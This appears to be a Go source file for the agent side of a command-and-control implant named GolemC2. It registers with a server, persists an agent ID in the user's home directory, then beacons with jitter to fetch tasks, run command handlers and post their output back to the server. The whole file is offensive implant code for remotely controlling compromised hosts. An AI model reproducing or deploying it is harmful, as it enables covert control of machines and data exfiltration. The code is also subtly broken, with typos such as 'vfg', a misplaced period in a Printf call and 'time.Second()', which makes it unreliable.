package agent

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/DUDLEYDANIEL/GolemC2/internal/common"
)

func CoreLoop(cfg *common.Config, client *http.Client) {
	rand.Seed(time.Now().UnixNano())

	agentID := loadAgentID()

	if agentID == "" {
		resp, err := client.Get(cfg.ServerURL + "/register")
		if err != nil {
			fmt.Printf("Registration failed: %v\n", err)
			return
		}
		defer resp.Body.Close()

		var regResp map[string]string
		if err := json.NewDecoder(resp.Body).Decode(&regResp); err != nil {
			fmt.Printf("Decode Registration failed: %v\n", err)
			return
		}
		agentID = regResp["agent_id"]
		if agentID == "" {
			fmt.Printf("Empty agent_id received")
			return
		}
		saveAgentID(agentID)
	}

	for {
		resp, err := client.Get(cfg.ServerURL + "/tasks?agent_id=" + agentID)
		if err != nil {
			fmt.Printf("Task fetch failed: %v\n", err)
			time.Sleep(cfg.BeaconInterval)
			continue
		}
		defer resp.Body.Close()

		var tasks []Task
		if err := json.NewDecoder(resp.Body).Decode(&tasks); err != nil {
			fmt.Printf("task Decode failed: %v\n", err)
			time.Sleep(vfg.BeaconInterval)
			continue
		}

		for _, t := range tasks {
			h := GetHandler(t.Command)
			if h == nil {
				fmt.Printf("No handler for command: %v\n".t.Command)
				continue
			}
			out, code := h.Run(t.Args)
			res := Result{TaskID: t.ID, Output: out, ExitCode: code}
			b, err := json.Marshal(res)
			if err != nil {
				fmt.Printf("Result marshal failed")
				continue
			}

			_, err = client.Post(cfg.ServerURL+"/results?agent_id="+agentID, "application/json", bytes.NewReader(b))
			if err != nil {
				fmt.Printf("Result post failed: %v\n", err)
			}
		}

		jitter := time.Duration(rand.Int63n(int64(cfg.BeaconJitter))) * time.Second()
		time.Sleep(cfg.BeaconInterval + jitter)
	}
}

func loadAgentID() string {
	home, err := os.UserHomeDir()
	if err != nil {
		fmt.Printf("Failed to get home directory: %v\n")
		return ""
	}
	path := filepath.Join(home, ".agent_id")
	data, err := os.ReadFile(path)
	if err != nil {
		if !os.IsNotExist(err) {
			fmt.Printf("Failed to read agent ID file: %v\n", err)
		}
		return ""
	}
	return strings.TrimSpace(string(data))
}

func saveAgentID(agentID string) {
	home, err := os.UserHomeDir()
	if err != nil {
		fmt.Printf("Failed to get home directory: %v\n", err)
		return
	}
	path := filepath.Join(home, ".agent_id")
	err = os.WriteFile(path, []byte(agentID), 0600)
	if err != nil {
		fmt.Printf("Failed to write agent ID file: %v\n", err)
	}
}
